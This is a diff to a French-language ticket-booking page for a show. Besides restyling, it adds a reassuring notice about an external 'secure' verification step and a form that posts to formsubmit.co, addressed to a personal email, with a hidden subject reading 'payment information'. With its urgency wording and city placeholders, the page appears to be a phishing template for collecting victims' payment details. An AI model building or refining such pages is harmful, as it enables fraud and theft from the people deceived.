@@ -7,23 +7,32 @@
   <style>
     body {
       font-family: 'Segoe UI', sans-serif;
-      background-color: #f0f2f5;
-      color: #333;
+      background-color: #ffffff;
+      color: #222;
       margin: 0;
       padding: 2rem;
       text-align: center;
     }
     h1 {
-      color: #1a1a1a;
+      color: #003366;
       margin-bottom: 1rem;
+      font-size: 2rem;
     }
     p {
-      font-size: 1.2rem;
+      font-size: 1.1rem;
+    }
+    .notice {
+      font-size: 0.95rem;
+      color: #666;
+      margin-top: 1.5rem;
+      max-width: 700px;
+      margin-left: auto;
+      margin-right: auto;
     }
     button {
       margin-top: 1.5rem;
       padding: 0.75rem 1.5rem;
-      background-color: #0066cc;
+      background-color: #003366;
       color: #fff;
       font-weight: bold;
       border: none;
@@ -31,17 +40,23 @@
       border-radius: 4px;
     }
     button:hover {
-      background-color: #005bb5;
+      background-color: #00509e;
     }
     form {
       margin-top: 2rem;
+      background-color: #f5f5f5;
+      padding: 2rem;
+      border-radius: 8px;
+      max-width: 500px;
+      margin-left: auto;
+      margin-right: auto;
     }
     select, input {
       margin-top: 1rem;
       padding: 0.5rem;
       font-size: 1rem;
-      width: 300px;
-      max-width: 100%;
+      width: 90%;
+      max-width: 400px;
     }
     input::placeholder {
       color: #888;
@@ -54,6 +69,13 @@
     <p>Bienvenue sur la page de réservation pour <span id="ville2">...</span> !<br>
        Ce spectacle est exceptionnel et les places sont limitées.<br>
        <span id="adresse">Adresse à venir</span></p>
+
+    <p class="notice">
+      Pour finaliser votre réservation, vous devrez valider un formulaire sécurisé fourni par notre prestataire externe FormSubmit.<br>
+      Cette étape supplémentaire est essentielle : elle permet de garantir la sécurité de vos données et de lutter contre les envois automatisés (robots).<br>
+      Le message de vérification peut s'afficher en anglais. Il s'agit d'une procédure standard, fiable et largement utilisée sur le web.<br>
+      Veuillez accepter cette étape pour recevoir correctement vos informations par e-mail.
+    </p>
 
     <form action="https://formsubmit.co/marcomarco2026@mail.com" method="POST">
       <input type="hidden" name="_subject" value="Information de paiement">
